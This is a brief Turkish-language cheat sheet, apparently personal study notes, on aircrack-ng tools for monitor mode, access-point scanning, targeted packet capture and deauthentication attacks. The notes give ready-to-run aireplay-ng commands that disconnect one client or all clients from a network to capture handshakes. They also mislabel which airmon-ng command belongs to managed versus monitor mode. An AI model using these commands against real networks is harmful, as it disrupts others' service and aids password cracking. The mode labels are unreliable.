## 🧰 Kablosuz Ağ Araçları ve Komutları

### 🖥️ `ifconfig`
- Mevcut internet bağlantıları ile ilgili detaylı bilgi verir.

### 📶 `iwconfig`
- Mevcut Wi-Fi bağlantıları ile ilgili detaylı bilgi verir.

---

## 🛠️ `airmon-ng` (start/stop) (interface)

### 📡 Managed Mode
- Wi-Fi adaptörünün varsayılan internete bağlanma modudur.
- Örnek:
  ```bash
  airmon-ng start wlan0
  ```

### 🎯 Monitor Mode
- Wi-Fi adaptörünün sadece dinleme ve bilgi toplama modudur.
- Örnek:
  ```bash
  airmon-ng stop wlan0mon
  ```

---

## 🔍 `airodump-ng` (interface)

- Etraftaki modemler hakkında bilgi toplar.

### Gösterilen Terimler:
- 🆔 **BSSID** : Modemin MAC adresi  
- 📉 **PWR** : Modemin Wi-Fi adaptörüne olan sinyal gücü / uzaklığı  
- 📡 **CH** : Modemin kullandığı kanal  
- 🔐 **ENC** : Modemin şifreleme türü  
- 🏷️ **ESSID** : Modem adı

---

## 📄 Hedefli Dinleme (airodump-ng --channel ...)
```bash
airodump-ng --channel 12 --bssid 40:30:20:10 --write txt wlan0mon
```
- Hedef modeme özel bilgi toplar.

### Gösterilen Ek Terimler:
- 🆔 **BSSID** : Modemin MAC adresi  
- 👥 **STATION** : Modeme bağlı cihazların MAC adresleri  
- 📦 **Frames** : Bağlı cihazların gönderdiği/alınan veri paketi sayısı

---

## 🚫 Deauthentication Saldırısı

### 🎯 Belirli Bir Cihaza Yönelik
```bash
aireplay-ng --deauth 1000 -a 40:30:20:10 -c 10:20:30:40 wlan0mon
```
- Belirli bir cihazı modeme bağlıyken düşürür (örneğin handshake yakalamak için)

### 🎯 Tüm Cihazlara Yönelik
```bash
aireplay-ng --deauth 1000 -a 40:30:20:10 wlan0mon
```
- Modeme bağlı tüm cihazları hedef alır
